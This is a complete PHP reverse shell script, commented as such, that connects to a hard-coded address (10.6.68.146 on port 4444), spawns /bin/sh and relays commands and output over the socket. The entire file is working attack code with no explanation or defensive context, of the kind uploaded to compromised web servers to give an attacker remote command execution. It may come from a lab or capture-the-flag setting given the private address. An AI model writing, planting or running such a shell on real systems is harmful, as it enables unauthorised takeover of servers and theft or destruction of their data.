<?php
// Reverse shell PHP script

// Target IP address and port
$ip = '10.6.68.146';
$port = 4444;

// Create a socket
$sock = fsockopen($ip, $port);
if (!$sock) {
    die('Could not create socket.');
}

// Execute a shell and redirect input/output
$descriptorspec = array(
    0 => array('pipe', 'r'),  // stdin
    1 => array('pipe', 'w'),  // stdout
    2 => array('pipe', 'w')   // stderr
);

$process = proc_open('/bin/sh', $descriptorspec, $pipes);
if (!is_resource($process)) {
    die('Could not spawn shell.');
}

while ($sock && !feof($sock)) {
    // Read data from the socket
    $input = fgets($sock);
    fwrite($pipes[0], $input);
    fflush($pipes[0]);

    // Read data from the shell
    $output = stream_get_contents($pipes[1]);
    fwrite($sock, $output);
    fflush($sock);
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
?>

